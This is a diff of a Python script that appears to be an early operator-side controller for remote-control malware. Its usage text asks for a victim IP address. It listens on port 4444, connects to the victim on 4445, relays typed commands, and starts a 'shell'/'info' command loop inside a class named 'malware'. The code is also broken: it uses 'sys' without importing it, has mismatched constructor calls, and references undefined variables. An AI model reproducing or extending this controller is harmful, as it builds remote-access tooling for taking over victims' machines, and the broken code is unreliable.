@@ -1,82 +1,89 @@
-import socket
-import time
 import threading
-import sys
+import time
+import socket
+import random
+
+IN_PORT = 4444
+OUT_PORT = 4445
 
 
-class inThread(threading.Thread):
-    def __init__(self, prod_list,lock):
+def print_help():
+    print('Usage : python3 control.py <victim_IP_address>')
+
+
+class InThread(threading.Thread):
+    def __init__(self):
         super().__init__()
-        self.prod_list = prod_list
-        self.lock=lock
 
     def run(self):
-        s = socket.socket() #Par défaut, construit un socket TCP
-        s.bind(('',4444))
-        s.listen(5) #Nb connexions max entre parenthèses
+        s = socket.socket()  # Par défaut, construit un socket TCP
+        s.bind(('', IN_PORT))
+        s.listen(1)  # Nb connexions max entre parenthèses
 
-        conn, addr = s.accept() #Renvoie une connexion et l'adresse (Port + IP)
+        conn, addr = s.accept()  # Renvoie une connexion et l'adresse (Port + IP)
 
         again = True
         while again:
-            msg = conn.recv(1024).decode('UTF-8')  #Taille de buffer entre parenthèses
-            if msg == '!quit':
+            msg = conn.recv(1024).decode('UTF-8')  # Taille de buffer entre parenthèses
+            if msg == 'exit':
                 again = False
             else:
                 print(msg)
 
-    def stop(self):
-    	s.close()
+        s.close()
 
-class outThread(threading.Thread):
-    def __init__(self,ip):
+
+class OutThread(threading.Thread):
+    def __init__(self, ip):
         super().__init__()
         self.ip = ip
 
-    def __start__(self):
-    	s = socket.socket()
+    def run(self):
+        s = socket.socket()
 
-    def sending(self, message):
+        s.connect((self.ip, OUT_PORT))
+
         again = True
         while again:
-            shell = input('{} > shell > '.format(ipaddr))
+            msg = input()
+            if msg == 'exit':
+                again = False
 
-            s.sendall(message.encode('UTF-8'))
+            s.sendall(msg.encode('UTF-8'))
+
+        s.close()
+
+
+class malware():
+    def __init__(self, ip, out_port=OUT_PORT, in_port=IN_PORT):
+        self.ip = ip
+        self.out_port = out_port
+        self.in_port = in_port
+
+    def run(self):
+        print("Trying to reach {} on port {}".format(self.ip, self.out_port))
+        self.prod = InThread(self.in_port)
+        self.cons = OutThread(self.ip, self.out_port)
+        self.prod.start()
+        self.cons.start()
 
     def stop(self):
-    	s.close()
+        self.prod.stop()
+        self.cons.stop()
 
 
-
-
-#Begin session
-
-end = False
-while not end:
-	cmd = input('{} > '.format(ipaddr))
-	if cmd ='':
-		pass
-	elif cmd =='quit':
-		s.send
-		end = True
-	elif cmd =='help':
-		help()
-	elif cmd =='info':
-		get_info()
-	elif cmd =='shell':
-		shell()
-	else:
-		help()
-
-#Close session
-
-shell = input('{} > shell > '.format(ipaddr))
-
-print("Test")
-#coucou
-if len(sys.argv) < 3:
-	pass #print help
-elif len(sys.argv) == 4:
-	pass #do stuff
+if sys.argv == 1:
+    ipaddr = sys.argv[1]
+    malw = malware(ip)
+    malw.start()
 else:
-	pass 
+    print_help()
+
+if cons.isAlive() and prod.isAlive():
+    list = ['info', 'shell']
+
+    end = False
+    while not end:
+        cmd = input('{} > '.format(ipaddr))
+
+
